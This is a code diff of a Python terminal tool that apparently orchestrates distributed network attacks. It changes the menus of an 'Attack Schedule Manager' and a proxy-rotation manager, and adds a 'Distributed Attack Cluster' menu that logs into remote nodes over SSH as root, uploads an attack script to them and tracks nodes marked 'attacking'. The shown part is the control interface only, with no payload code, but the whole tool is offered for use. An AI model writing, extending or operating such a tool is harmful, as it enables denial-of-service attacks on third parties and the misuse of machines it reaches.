-            print(f"  {Colors.BOLD}{Colors.MAGENTA}● ATTACK SCHEDULE MANAGER{Colors.RESET}")
-            print(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}\n")
-
-            tz_display = (f"{Colors.YELLOW}Tehran (UTC+3:30){Colors.RESET}"
-                          if _TZ_TEHRAN[0]
-                          else f"{Colors.DIM}Local system time{Colors.RESET}")
-            print(f"  {Colors.BOLD}● TIMEZONE{Colors.RESET}")
-            print(f"  {Colors.MAGENTA}  [T]{Colors.RESET}  Toggle timezone mode         "
-                  f"{Colors.DIM}→ currently:{Colors.RESET} {tz_display}")
+            alive, dead, _ = await PROXY_MANAGER.validate_all()
+            if alive > 0:
+                print(f"  {Colors.CYAN}➜ Creating sessions for working proxies...{Colors.RESET}")
+                created = await PROXY_MANAGER.create_sessions()
+                PROXY_MANAGER.enabled = True
+                print(f"  {Colors.GREEN}✓ {created} sessions ready. Proxy rotation ENABLED.{Colors.RESET}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "4":
+            PROXY_MANAGER.print_stats()
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "5":
+            print(f"\n  {Colors.BOLD}Available rotation modes:{Colors.RESET}\n")
+            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  random          {Colors.DIM}— random proxy per request{Colors.RESET}")
+            print(f"  {Colors.CYAN}  [2]{Colors.RESET}  round_robin     {Colors.DIM}— sequential rotation{Colors.RESET}")
+            print(f"  {Colors.CYAN}  [3]{Colors.RESET}  weighted        {Colors.DIM}— favor faster proxies{Colors.RESET}")
             print()
+            mode_input = input(f"  {Colors.BOLD}➜ Select mode [{Colors.YELLOW}current: {PROXY_MANAGER.rotation_mode}{Colors.RESET}]: {Colors.RESET}").strip()
 
-            if SCHEDULE.is_empty():
-                print(f"  {Colors.DIM}  (no slots configured yet){Colors.RESET}\n")
+            mode_map = {"1": "random", "2": "round_robin", "3": "weighted"}
+
+            if not mode_input:
+                mode = PROXY_MANAGER.rotation_mode
+            elif mode_input in mode_map:
+                mode = mode_map[mode_input]
+            elif mode_input in ("random", "round_robin", "weighted"):
+                mode = mode_input
             else:
-                print(f"  {Colors.BOLD}● CONFIGURED SLOTS ({len(SCHEDULE.slots)}){Colors.RESET}\n")
-                for i, desc in enumerate(SCHEDULE.describe(), 1):
-                    print(f"  {Colors.CYAN}{i:>2}.{Colors.RESET} {desc}")
-                nxt = SCHEDULE.next_window()
-                if nxt:
-                    s, e = nxt
-                    now = now_dt()
-                    if s <= now < e:
-                        print(f"\n  {Colors.GREEN}▶ Currently active: "
-                              f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
-                    else:
-                        delta = (s - now).total_seconds()
-                        print(f"\n  {Colors.YELLOW}▶ Next window: "
-                              f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}"
-                              f"  (in {int(delta // 3600):02d}:{int((delta % 3600) // 60):02d}:{int(delta % 60):02d}){Colors.RESET}")
-                else:
-                    print(f"\n  {Colors.RED}▶ No future windows (all slots expired){Colors.RESET}")
-                print()
+                mode = None
 
-            print(f"  {Colors.BOLD}● ADD SLOT{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Absolute  — specific date + time range (one-shot)")
-            print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Daily     — every day HH:MM → HH:MM (with day filter)")
-            print(f"  {Colors.CYAN}  [3]{Colors.RESET}  Weekly    — specific weekday(s)")
-            print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Monthly   — day N of every month")
-            print(f"  {Colors.CYAN}  [5]{Colors.RESET}  Hourly    — every hour at minute M for D minutes")
-            print()
-            print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
-            print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all slots")
-            print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
-            print()
-            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
-
-            choice = safe_input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
-
-            if choice == "0":
-                return
-            elif choice == "t":
-                _TZ_TEHRAN[0] = not _TZ_TEHRAN[0]
-                save_timezone()
-                if _TZ_TEHRAN[0]:
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Timezone set to "
-                          f"{Colors.YELLOW}Tehran (UTC+3:30){Colors.RESET}. Saved permanently.")
-                else:
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Timezone set to "
-                          f"{Colors.DIM}Local system time{Colors.RESET}. Saved permanently.")
-                time.sleep(1.1)
-            elif choice == "1":
-                _add_absolute()
-            elif choice == "2":
-                _add_daily()
-            elif choice == "3":
-                _add_weekly()
-            elif choice == "4":
-                _add_monthly()
-            elif choice == "5":
-                _add_hourly()
-            elif choice == "c":
-                if SCHEDULE.is_empty():
-                    continue
-                confirm = safe_input(f"\n  {Colors.RED}Clear ALL schedule slots? (y/N): {Colors.RESET}").strip().lower()
-                if confirm == "y":
-                    SCHEDULE.clear()
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Schedule cleared")
-                    time.sleep(0.8)
-        except MenuBack:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Back to main menu")
-            time.sleep(0.4)
-            return
+            if mode:
+                PROXY_MANAGER.rotation_mode = mode
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Rotation mode set to: {Colors.BOLD}{mode}{Colors.RESET}")
+            else:
+                print(f"\n  {Colors.RED}⚠ Invalid mode{Colors.RESET}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "6":
+            url = input(f"  {Colors.BOLD}Validation URL [{Colors.DIM}{PROXY_MANAGER.validation_url}{Colors.RESET}]: ").strip()
+            if url:
+                PROXY_MANAGER.validation_url = url
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} URL updated")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "7":
+            t = input(f"  {Colors.BOLD}Timeout seconds [{Colors.DIM}{PROXY_MANAGER.validation_timeout}{Colors.RESET}]: ").strip()
+            if t.isdigit():
+                PROXY_MANAGER.validation_timeout = int(t)
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Timeout set to {Colors.BOLD}{t}s{Colors.RESET}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "8":
+            c = input(f"  {Colors.BOLD}Concurrency [{Colors.DIM}{PROXY_MANAGER.validation_concurrency}{Colors.RESET}]: ").strip()
+            if c.isdigit():
+                PROXY_MANAGER.validation_concurrency = int(c)
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Concurrency set to {Colors.BOLD}{c}{Colors.RESET}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "9":
+            if not PROXY_MANAGER.working_proxies:
+                print(f"\n  {Colors.RED}⚠ No working proxies to save.{Colors.RESET}")
+            else:
+                fp = PROXY_MANAGER.save_working()
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Saved {Colors.BOLD}{len(PROXY_MANAGER.working_proxies)}{Colors.RESET} proxies to {fp}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "c":
+            confirm = input(f"\n  {Colors.RED}Clear ALL proxies? (y/N): {Colors.RESET}").strip().lower()
+            if confirm == "y":
+                msg = PROXY_MANAGER.clear_all()
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
 async def node_management_menu():
     while True:
-        try:
-            clear_screen()
-            total = len(NODE_MANAGER.nodes)
-            ready = sum(1 for n in NODE_MANAGER.nodes if n.status == "ready")
-            attacking = sum(1 for n in NODE_MANAGER.nodes if n.status == "attacking")
-            errored = sum(1 for n in NODE_MANAGER.nodes if n.status == "error")
+        clear_screen()
+        total = len(NODE_MANAGER.nodes)
+        ready = sum(1 for n in NODE_MANAGER.nodes if n.status == "ready")
+        attacking = sum(1 for n in NODE_MANAGER.nodes if n.status == "attacking")
+        errored = sum(1 for n in NODE_MANAGER.nodes if n.status == "error")
 
-            print(f"""{Colors.BOLD}{Colors.MAGENTA}
+        print(f"""{Colors.BOLD}{Colors.MAGENTA}
   ███╗   ██╗ ██████╗ ██████╗ ███████╗
   ████╗  ██║██╔═══██╗██╔══██╗██╔════╝
   ██╔██╗ ██║██║   ██║██║  ██║█████╗  
@@ -3424,214 +2684,214 @@ async def node_management_menu():
 {Colors.RESET}{Colors.BOLD}{Colors.DIM}      ── Distributed Attack Cluster ──{Colors.RESET}
 """)
 
-            print(f"  {Colors.BOLD}● CLUSTER STATUS{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Total Nodes      {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Ready            {Colors.BOLD}{Colors.GREEN}{ready:>5}{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Attacking        {Colors.BOLD}{Colors.MAGENTA}{attacking:>5}{Colors.RESET}")
-            print(f"  {Colors.DIM}└─{Colors.RESET} Errors           {Colors.BOLD}{Colors.RED}{errored:>5}{Colors.RESET}")
+        print(f"  {Colors.BOLD}● CLUSTER STATUS{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Total Nodes      {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Ready            {Colors.BOLD}{Colors.GREEN}{ready:>5}{Colors.RESET}")
+        print(f"  {Colors.DIM}├─{Colors.RESET} Attacking        {Colors.BOLD}{Colors.MAGENTA}{attacking:>5}{Colors.RESET}")
+        print(f"  {Colors.DIM}└─{Colors.RESET} Errors           {Colors.BOLD}{Colors.RED}{errored:>5}{Colors.RESET}")
+        print()
+
+        if NODE_MANAGER.nodes:
+            print(f"  {Colors.BOLD}● NODES{Colors.RESET}")
+            header = f"  {'#':<3} {'ENDPOINT':<22} {'USER':<10} {'CPU':>6} {'RAM':>6} {'LOAD':>7}  STATUS"
+            print(f"{Colors.DIM}{header}{Colors.RESET}")
+            print(f"  {Colors.DIM}{'─' * 84}{Colors.RESET}")
+            status_colors = {
+                "pending": Colors.DIM, "connecting": Colors.CYAN,
+                "connected": Colors.CYAN, "deploying": Colors.YELLOW,
+                "ready": Colors.GREEN, "attacking": Colors.MAGENTA,
+                "error": Colors.RED,
+            }
+            for i, n in enumerate(NODE_MANAGER.nodes, 1):
+                sc = status_colors.get(n.status, Colors.DIM)
+                cpu_str = f"{n.cpu:>5.1f}%" if n.last_update else "  --  "
+                ram_str = f"{n.ram:>5.1f}%" if n.last_update else "  --  "
+                load_str = f"{n.load:>7}" if n.last_update else "    -- "
+                print(f"  {i:<3} {n.label():<22} {n.username:<10} "
+                      f"{cpu_str} {ram_str} {load_str}  {sc}{n.status}{Colors.RESET}")
+                if n.error_msg and n.status == "error":
+                    print(f"      {Colors.DIM}└─ {n.error_msg[:70]}{Colors.RESET}")
             print()
+        else:
+            print(f"  {Colors.YELLOW}⚠{Colors.RESET} No nodes configured. Add your first node below.\n")
 
-            if NODE_MANAGER.nodes:
-                print(f"  {Colors.BOLD}● NODES{Colors.RESET}")
-                header = f"  {'#':<3} {'ENDPOINT':<22} {'USER':<10} {'CPU':>6} {'RAM':>6} {'LOAD':>7}  STATUS"
-                print(f"{Colors.DIM}{header}{Colors.RESET}")
-                print(f"  {Colors.DIM}{'─' * 84}{Colors.RESET}")
-                status_colors = {
-                    "pending": Colors.DIM, "connecting": Colors.CYAN,
-                    "connected": Colors.CYAN, "deploying": Colors.YELLOW,
-                    "ready": Colors.GREEN, "attacking": Colors.MAGENTA,
-                    "error": Colors.RED,
-                }
-                for i, n in enumerate(NODE_MANAGER.nodes, 1):
-                    sc = status_colors.get(n.status, Colors.DIM)
-                    cpu_str = f"{n.cpu:>5.1f}%" if n.last_update else "  --  "
-                    ram_str = f"{n.ram:>5.1f}%" if n.last_update else "  --  "
-                    load_str = f"{n.load:>7}" if n.last_update else "    -- "
-                    print(f"  {i:<3} {n.label():<22} {n.username:<10} "
-                          f"{cpu_str} {ram_str} {load_str}  {sc}{n.status}{Colors.RESET}")
-                    if n.error_msg and n.status == "error":
-                        print(f"      {Colors.DIM}└─ {n.error_msg[:70]}{Colors.RESET}")
-                print()
-            else:
-                print(f"  {Colors.YELLOW}⚠{Colors.RESET} No nodes configured. Add your first node below.\n")
+        print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
+        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Add node (SSH)                  {Colors.DIM}→ credentials + auto-deploy{Colors.RESET}")
+        print(f"  {Colors.GREEN}  [2]{Colors.RESET}  Deploy to all nodes             {Colors.DIM}→ upload node script{Colors.RESET}")
+        print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Refresh stats (CPU/RAM)         {Colors.DIM}→ live metrics{Colors.RESET}")
+        print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Test SSH connections            {Colors.DIM}→ ping all nodes{Colors.RESET}")
+        print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Restart node                    {Colors.DIM}→ reconnect{Colors.RESET}")
+        print(f"  {Colors.RED}  [6]{Colors.RESET}  Remove node                     {Colors.DIM}→ delete{Colors.RESET}")
+        print()
+        print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
+        print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all nodes")
+        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
+        print()
 
-            print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Add node (SSH)                  {Colors.DIM}→ credentials + auto-deploy{Colors.RESET}")
-            print(f"  {Colors.GREEN}  [2]{Colors.RESET}  Deploy to all nodes             {Colors.DIM}→ upload node script{Colors.RESET}")
-            print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Refresh stats (CPU/RAM)         {Colors.DIM}→ live metrics{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Test SSH connections            {Colors.DIM}→ ping all nodes{Colors.RESET}")
-            print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Restart node                    {Colors.DIM}→ reconnect{Colors.RESET}")
-            print(f"  {Colors.RED}  [6]{Colors.RESET}  Remove node                     {Colors.DIM}→ delete{Colors.RESET}")
-            print()
-            print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
-            print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all nodes")
-            print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
-            print()
+        if not PARAMIKO_AVAILABLE:
+            print(f"  {Colors.RED}⚠  paramiko not installed — Node feature requires paramiko{Colors.RESET}")
+            print(f"  {Colors.DIM}   Install: pip install paramiko --break-system-packages{Colors.RESET}\n")
 
-            if not PARAMIKO_AVAILABLE:
-                print(f"  {Colors.RED}⚠  paramiko not installed — Node feature requires paramiko{Colors.RESET}")
-                print(f"  {Colors.DIM}   Install: pip install paramiko --break-system-packages{Colors.RESET}\n")
+        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
 
-            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
+        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
 
-            choice = safe_input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
-
-            if choice == "0":
-                return
-            elif choice == "1":
+        if choice == "0":
+            return
+        elif choice == "1":
+            try:
+                ip = input(f"  {Colors.BOLD}➜ Node IP address: {Colors.RESET}").strip()
+                if not ip:
+                    continue
+                port = int(input(f"  {Colors.BOLD}➜ SSH port [{Colors.GREEN}22{Colors.RESET}]: ").strip() or "22")
+                username = input(f"  {Colors.BOLD}➜ Username [{Colors.GREEN}root{Colors.RESET}]: ").strip() or "root"
                 try:
-                    ip = safe_input(f"  {Colors.BOLD}➜ Node IP address: {Colors.RESET}").strip()
-                    if not ip:
-                        continue
-                    port = int(safe_input(f"  {Colors.BOLD}➜ SSH port [{Colors.GREEN}22{Colors.RESET}]: ").strip() or "22")
-                    username = safe_input(f"  {Colors.BOLD}➜ Username [{Colors.GREEN}root{Colors.RESET}]: ").strip() or "root"
-                    password = safe_getpass(f"  {Colors.BOLD}➜ Password: {Colors.RESET}")
-                    ok, result = NODE_MANAGER.add(ip, port, username, password)
-                    if ok:
-                        print(f"\n  {Colors.GREEN}✓{Colors.RESET} Node added: {Colors.BOLD}{result.label()}{Colors.RESET}")
-                        print(f"  {Colors.CYAN}➜ Testing connection...{Colors.RESET}")
-                        if await NODE_MANAGER.connect(result):
-                            print(f"  {Colors.GREEN}✓{Colors.RESET} SSH connected")
-                            print(f"  {Colors.CYAN}➜ Checking python3...{Colors.RESET}")
-                            if await NODE_MANAGER.check_python(result):
-                                print(f"  {Colors.GREEN}✓{Colors.RESET} python3 available")
-                            else:
-                                print(f"  {Colors.RED}✗{Colors.RESET} python3 not found")
-                            print(f"  {Colors.CYAN}➜ Uploading node script...{Colors.RESET}")
-                            if await NODE_MANAGER.deploy(result):
-                                print(f"  {Colors.GREEN}✓{Colors.RESET} Deployed successfully — node ready")
-                            else:
-                                print(f"  {Colors.RED}✗{Colors.RESET} {result.error_msg}")
+                    password = getpass.getpass(f"  {Colors.BOLD}➜ Password: {Colors.RESET}")
+                except Exception:
+                    password = input(f"  {Colors.BOLD}➜ Password: {Colors.RESET}")
+                ok, result = NODE_MANAGER.add(ip, port, username, password)
+                if ok:
+                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Node added: {Colors.BOLD}{result.label()}{Colors.RESET}")
+                    print(f"  {Colors.CYAN}➜ Testing connection...{Colors.RESET}")
+                    if await NODE_MANAGER.connect(result):
+                        print(f"  {Colors.GREEN}✓{Colors.RESET} SSH connected")
+                        print(f"  {Colors.CYAN}➜ Checking python3...{Colors.RESET}")
+                        if await NODE_MANAGER.check_python(result):
+                            print(f"  {Colors.GREEN}✓{Colors.RESET} python3 available")
+                        else:
+                            print(f"  {Colors.RED}✗{Colors.RESET} python3 not found")
+                        print(f"  {Colors.CYAN}➜ Uploading node script...{Colors.RESET}")
+                        if await NODE_MANAGER.deploy(result):
+                            print(f"  {Colors.GREEN}✓{Colors.RESET} Deployed successfully — node ready")
                         else:
                             print(f"  {Colors.RED}✗{Colors.RESET} {result.error_msg}")
                     else:
-                        print(f"\n  {Colors.RED}✗{Colors.RESET} {result}")
-                except ValueError:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid port")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "2":
-                if not NODE_MANAGER.nodes:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes to deploy")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                print(f"\n  {Colors.CYAN}➜ Deploying to {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
-                for n in NODE_MANAGER.nodes:
-                    print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
-                    if not n.client:
-                        print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
-                        if not await NODE_MANAGER.connect(n):
-                            print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
-                            continue
-                        print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")
-                    print(f"    {Colors.CYAN}➜ Deploying...{Colors.RESET}")
-                    if await NODE_MANAGER.deploy(n):
-                        print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}")
-                    else:
-                        print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
-                safe_input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "3":
-                if not NODE_MANAGER.nodes:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                print(f"\n  {Colors.CYAN}➜ Refreshing stats from {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
-                await asyncio.gather(*[NODE_MANAGER.get_stats(n) for n in NODE_MANAGER.nodes],
-                                     return_exceptions=True)
-                print(f"  {Colors.GREEN}✓{Colors.RESET} Stats updated")
-                await asyncio.sleep(1)
-            elif choice == "4":
-                if not NODE_MANAGER.nodes:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                print(f"\n  {Colors.CYAN}➜ Testing {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
-                ok_count = 0
-                fail_count = 0
-                for n in NODE_MANAGER.nodes:
-                    print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}... ",
-                          end="", flush=True)
-                    if n.client is not None:
-                        try:
-                            n.client.close()
-                        except Exception:
-                            pass
-                        n.client = None
-                    try:
-                        result = await NODE_MANAGER.connect(n)
-                    except Exception as e:
-                        result = False
-                        n.error_msg = f"{type(e).__name__}: {str(e)[:60]}"
-                    if result:
-                        ok_count += 1
-                        print(f"{Colors.GREEN}OK{Colors.RESET}")
-                    else:
-                        fail_count += 1
-                        err = n.error_msg or "unknown error"
-                        print(f"{Colors.RED}FAIL{Colors.RESET} {Colors.DIM}({err}){Colors.RESET}")
+                        print(f"  {Colors.RED}✗{Colors.RESET} {result.error_msg}")
+                else:
+                    print(f"\n  {Colors.RED}✗{Colors.RESET} {result}")
+            except ValueError:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid port")
+            except KeyboardInterrupt:
                 print()
-                print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
-                print(f"  {Colors.DIM}├─{Colors.RESET} OK     "
-                      f"{Colors.GREEN}{ok_count}{Colors.RESET}")
-                print(f"  {Colors.DIM}└─{Colors.RESET} Failed "
-                      f"{Colors.RED}{fail_count}{Colors.RESET}")
-                safe_input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-
-            elif choice == "5":
-                if not NODE_MANAGER.nodes:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                print(f"\n  {Colors.BOLD}Select node to restart:{Colors.RESET}")
-                for i, n in enumerate(NODE_MANAGER.nodes, 1):
-                    print(f"  {i}. {n.label()}")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "2":
+            if not NODE_MANAGER.nodes:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes to deploy")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+                continue
+            print(f"\n  {Colors.CYAN}➜ Deploying to {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
+            for n in NODE_MANAGER.nodes:
+                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
+                if not n.client:
+                    print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
+                    if not await NODE_MANAGER.connect(n):
+                        print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
+                        continue
+                    print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")
+                print(f"    {Colors.CYAN}➜ Deploying...{Colors.RESET}")
+                if await NODE_MANAGER.deploy(n):
+                    print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}")
+                else:
+                    print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
+            input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "3":
+            if not NODE_MANAGER.nodes:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+                continue
+            print(f"\n  {Colors.CYAN}➜ Refreshing stats from {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
+            await asyncio.gather(*[NODE_MANAGER.get_stats(n) for n in NODE_MANAGER.nodes],
+                                 return_exceptions=True)
+            print(f"  {Colors.GREEN}✓{Colors.RESET} Stats updated")
+            await asyncio.sleep(1)
+        elif choice == "4":
+            if not NODE_MANAGER.nodes:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+                continue
+            print(f"\n  {Colors.CYAN}➜ Testing {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
+            ok_count = 0
+            fail_count = 0
+            for n in NODE_MANAGER.nodes:
+                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}... ",
+                      end="", flush=True)
+                if n.client is not None:
+                    try:
+                        n.client.close()
+                    except Exception:
+                        pass
+                    n.client = None
                 try:
-                    idx = int(safe_input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
-                    if 0 <= idx < len(NODE_MANAGER.nodes):
-                        n = NODE_MANAGER.nodes[idx]
-                        if n.client:
-                            try: n.client.close()
-                            except Exception: pass
-                        n.client = None
-                        n.status = "pending"
-                        print(f"\n  {Colors.CYAN}➜ Reconnecting to {n.label()}...{Colors.RESET}")
-                        if await NODE_MANAGER.connect(n):
-                            print(f"  {Colors.GREEN}✓ Reconnected{Colors.RESET}")
-                        else:
-                            print(f"  {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
-                except (ValueError, IndexError):
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "6":
-                if not NODE_MANAGER.nodes:
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
-                    safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-                print(f"\n  {Colors.BOLD}Select node to remove:{Colors.RESET}")
-                for i, n in enumerate(NODE_MANAGER.nodes, 1):
-                    print(f"  {i}. {n.label()}")
-                try:
-                    idx = int(safe_input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
-                    if 0 <= idx < len(NODE_MANAGER.nodes):
-                        n = NODE_MANAGER.nodes[idx]
-                        label = n.label()
-                        NODE_MANAGER.remove(n)
-                        print(f"\n  {Colors.GREEN}✓{Colors.RESET} Removed {label}")
-                except (ValueError, IndexError):
-                    print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-            elif choice == "c":
-                if not NODE_MANAGER.nodes:
-                    continue
-                confirm = safe_input(f"\n  {Colors.RED}Remove ALL nodes? (y/N): {Colors.RESET}").strip().lower()
-                if confirm == "y":
-                    for n in list(NODE_MANAGER.nodes):
-                        NODE_MANAGER.remove(n)
-                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} All nodes removed")
-                safe_input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-        except MenuBack:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Back to main menu")
-            time.sleep(0.4)
-            return
+                    result = await NODE_MANAGER.connect(n)
+                except Exception as e:
+                    result = False
+                    n.error_msg = f"{type(e).__name__}: {str(e)[:60]}"
+                if result:
+                    ok_count += 1
+                    print(f"{Colors.GREEN}OK{Colors.RESET}")
+                else:
+                    fail_count += 1
+                    err = n.error_msg or "unknown error"
+                    print(f"{Colors.RED}FAIL{Colors.RESET} {Colors.DIM}({err}){Colors.RESET}")
+            print()
+            print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
+            print(f"  {Colors.DIM}├─{Colors.RESET} OK     "
+                  f"{Colors.GREEN}{ok_count}{Colors.RESET}")
+            print(f"  {Colors.DIM}└─{Colors.RESET} Failed "
+                  f"{Colors.RED}{fail_count}{Colors.RESET}")
+            input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "5":
+            if not NODE_MANAGER.nodes:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+                continue
+            print(f"\n  {Colors.BOLD}Select node to restart:{Colors.RESET}")
+            for i, n in enumerate(NODE_MANAGER.nodes, 1):
+                print(f"  {i}. {n.label()}")
+            try:
+                idx = int(input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
+                if 0 <= idx < len(NODE_MANAGER.nodes):
+                    n = NODE_MANAGER.nodes[idx]
+                    if n.client:
+                        try: n.client.close()
+                        except Exception: pass
+                    n.client = None
+                    n.status = "pending"
+                    print(f"\n  {Colors.CYAN}➜ Reconnecting to {n.label()}...{Colors.RESET}")
+                    if await NODE_MANAGER.connect(n):
+                        print(f"  {Colors.GREEN}✓ Reconnected{Colors.RESET}")
+                    else:
+                        print(f"  {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
+            except (ValueError, IndexError):
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "6":
+            if not NODE_MANAGER.nodes:
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
+                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+                continue
+            print(f"\n  {Colors.BOLD}Select node to remove:{Colors.RESET}")
